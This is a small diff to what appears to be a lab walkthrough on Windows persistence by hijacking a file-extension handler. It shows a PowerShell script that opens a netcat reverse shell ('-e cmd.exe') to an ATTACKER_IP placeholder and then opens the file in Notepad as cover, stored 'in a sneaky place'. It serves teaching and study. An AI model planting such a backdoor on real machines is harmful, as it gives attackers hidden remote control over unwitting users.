@@ -46,10 +46,12 @@ A ProgID is simply an identifier to a program installed on the system.
 Note: `%1` is like a placeholder for the name of the file to be opened
 
 1. To hijack the extension, we will change the command with our script that executes a backdoor and then opens the file. Let's make a script: (my script name: `sc.ps1`)
+
 ```
 Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <put your ATTACKER_IP> 4448"
 C:\Windows\system32\NOTEPAD.EXE $args[0]
 ```
+
 Save it in a sneaky place
 Note: pass $args[0] to notepad, as it will contain the name of the file to be opened, as given through %1
 
